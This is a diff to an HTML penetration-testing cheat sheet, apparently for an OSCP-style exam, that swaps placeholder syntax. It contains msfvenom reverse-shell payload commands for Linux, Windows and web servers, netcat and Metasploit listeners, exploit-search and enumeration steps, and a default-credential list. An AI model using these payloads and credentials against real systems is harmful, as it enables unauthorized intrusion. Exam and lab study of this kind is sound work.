@@ -146,10 +146,10 @@
         <pre><span class="c"># 1. Scans are already running (started at exam begin)</span>
 <span class="c"># 2. Read ALL nmap output before picking a vector</span>
 <span class="c"># 3. searchsploit EVERY service + version found:</span>
-searchsploit &lt;service&gt; &lt;version&gt;
-searchsploit -x &lt;path&gt;    <span class="c"># read without copying</span>
-searchsploit -m &lt;path&gt;    <span class="c"># copy to cwd</span>
-searchsploit --cve &lt;CVE&gt;
+searchsploit $SERVICE $VERSION
+searchsploit -x $PATH    <span class="c"># read without copying</span>
+searchsploit -m $PATH    <span class="c"># copy to cwd</span>
+searchsploit --cve $CVE
 
 <span class="c"># 4. Try default creds on every service with auth (see defaults below)</span>
 <span class="c"># 5. Web? → gobuster it immediately</span>
@@ -159,18 +159,18 @@ searchsploit --cve &lt;CVE&gt;
         <span class="sig-title">output signals</span>
         <div class="sig-entry">
           <span class="sig-signal"><span class="sig-label">Signal:</span> searchsploit returns RCE exploit for exact service version</span>
-          <span class="sig-cmd">searchsploit -x &lt;path&gt; <span class="sig-note">-- read the exploit first, understand what it does</span></span>
-          <span class="sig-cmd">searchsploit -m &lt;path&gt; <span class="sig-note">-- copy to cwd, then adapt LHOST/LPORT</span></span>
-          <span class="sig-cmd">searchsploit --cve &lt;CVE&gt; <span class="sig-note">-- confirm CVE, search for PoC on GitHub if needed</span></span>
+          <span class="sig-cmd">searchsploit -x $PATH <span class="sig-note">-- read the exploit first, understand what it does</span></span>
+          <span class="sig-cmd">searchsploit -m $PATH <span class="sig-note">-- copy to cwd, then adapt LHOST/LPORT</span></span>
+          <span class="sig-cmd">searchsploit --cve $CVE <span class="sig-note">-- confirm CVE, search for PoC on GitHub if needed</span></span>
         </div>
         <div class="sig-entry">
           <span class="sig-signal"><span class="sig-label">Signal:</span> Multiple open ports — unsure which to attack first</span>
           <span class="sig-note">-- Priority order: known CVE with public exploit &gt; anonymous access (FTP/SMB/NFS) &gt; web app &gt; brute force</span>
-          <span class="sig-cmd">nmap -p- --min-rate 5000 &lt;IP&gt; <span class="sig-note">-- make sure ALL ports are scanned before deciding</span></span>
+          <span class="sig-cmd">nmap -p- --min-rate 5000 $IP <span class="sig-note">-- make sure ALL ports are scanned before deciding</span></span>
         </div>
         <div class="sig-entry">
           <span class="sig-signal"><span class="sig-label">Signal:</span> Default creds work on a service</span>
-          <span class="sig-cmd">searchsploit &lt;service&gt; authenticated <span class="sig-note">-- look for post-auth RCE (admin panel → shell is common)</span></span>
+          <span class="sig-cmd">searchsploit $SERVICE authenticated <span class="sig-note">-- look for post-auth RCE (admin panel → shell is common)</span></span>
         </div>
       </div>
       <div class="moveon">
@@ -187,9 +187,9 @@ searchsploit --cve &lt;CVE&gt;
         <pre>admin:admin           admin:password        admin:admin123
 admin:                root:root             root:toor
 root:                 root:password         guest:guest
-&lt;service&gt;:&lt;service&gt;   <span class="c"># postgres:postgres  oracle:oracle  tomcat:tomcat</span>
-&lt;hostname&gt;:&lt;hostname&gt; <span class="c"># machine or company name as password</span>
-&lt;username&gt;:&lt;username&gt; <span class="c"># username same as password</span>
+$SERVICE:$SERVICE   <span class="c"># postgres:postgres  oracle:oracle  tomcat:tomcat</span>
+$HOSTNAME:$HOSTNAME <span class="c"># machine or company name as password</span>
+$USER:$USER <span class="c"># username same as password</span>
 administrator:Password123    administrator:Welcome1
 tomcat:s3cret         sa:sa    sa:password    pi:raspberry</pre></div>
     </section>
@@ -198,29 +198,29 @@ tomcat:s3cret         sa:sa    sa:password    pi:raspberry</pre></div>
       <div class="sec-head"><h2>Shell Generation — msfvenom</h2></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">all formats</span><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre><span class="c"># Linux ELF:</span>
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f elf -o shell.elf
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f elf -o shell32.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f elf -o shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f elf -o shell32.elf
 
 <span class="c"># Windows EXE:</span>
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f exe -o shell64.exe
-msfvenom -p windows/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f exe -o shell32.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f exe -o shell64.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f exe -o shell32.exe
 
 <span class="c"># Web shells:</span>
-msfvenom -p php/reverse_php LHOST=&lt;KALI&gt; LPORT=4444 -f raw -o shell.php
-msfvenom -p windows/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f asp -o shell.asp
-msfvenom -p windows/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f aspx -o shell.aspx
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f war -o shell.war
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f raw -o shell.jsp
+msfvenom -p php/reverse_php LHOST=$KALI LPORT=4444 -f raw -o shell.php
+msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f asp -o shell.asp
+msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f aspx -o shell.aspx
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=4444 -f war -o shell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=4444 -f raw -o shell.jsp
 
 <span class="c"># Staged (use with MSF handler):</span>
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f exe -o staged.exe</pre></div>
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$KALI LPORT=4444 -f exe -o staged.exe</pre></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">listeners</span><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre>rlwrap nc -lvnp 4444
 rlwrap nc -lvnp 443   <span class="c"># use 443 if 4444 is filtered</span>
 pwncat-cs -lp 4444    <span class="c"># auto-stabilizes + file transfer built in</span>
 
 <span class="c"># MSF handler:</span>
-msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST &lt;KALI&gt;; set LPORT 4444; run"</pre></div>
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $KALI; set LPORT 4444; run"</pre></div>
     </section>
 
     <section class="sec" id="stabilize">
@@ -249,14 +249,14 @@ Get-MpComputerStatus | Select AMServiceEnabled,AntispywareEnabled</pre></div>
       <div class="note n-warn">If no progress in 30 minutes, rotate to another target. Return with fresh eyes.</div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">run through before giving up on a target</span><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre><span class="c"># 1. ALL ports scanned? (including UDP):</span>
-sudo nmap -p- --min-rate 5000 &lt;IP&gt;
-sudo nmap -sU --top-ports 25 &lt;IP&gt;
+sudo nmap -p- --min-rate 5000 $IP
+sudo nmap -sU --top-ports 25 $IP
 
 <span class="c"># 2. Virtual hosts?</span>
-gobuster vhost -u http://&lt;IP&gt; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+gobuster vhost -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
 
 <span class="c"># 3. All file extensions tried?</span>
-gobuster dir -u http://&lt;IP&gt; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
+gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
   -x php,asp,aspx,txt,bak,zip,tar,sql,conf,xml,old
 
 <span class="c"># 4. All collected creds tried on ALL services?</span>
@@ -273,11 +273,11 @@ gobuster dir -u http://&lt;IP&gt; -w /usr/share/seclists/Discovery/Web-Content/r
       <div class="note n-bad">Metasploit can only be used on ONE target machine. Cannot be used for pivoting. Save it for the target where manual exploitation fails or costs too much time.</div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">basic workflow</span><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre>msfconsole -q
-search &lt;service&gt; &lt;version&gt;
-use &lt;module_path&gt;
+search $SERVICE $VERSION
+use $MODULE_PATH
 show options
-set RHOSTS &lt;IP&gt;
-set LHOST &lt;KALI&gt;
+set RHOSTS $IP
+set LHOST $KALI
 set LPORT 4444
 run</pre></div>
     </section>
@@ -292,7 +292,7 @@ run</pre></div>
 <span class="c"># Alt path:</span>
 type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
 <span class="c"># Low-priv partial credit:</span>
-whoami &amp;&amp; hostname &amp;&amp; type C:\Users\&lt;user&gt;\Desktop\local.txt</pre></div>
+whoami &amp;&amp; hostname &amp;&amp; type C:\Users\$USER\Desktop\local.txt</pre></div>
     </section>
 
   </main>
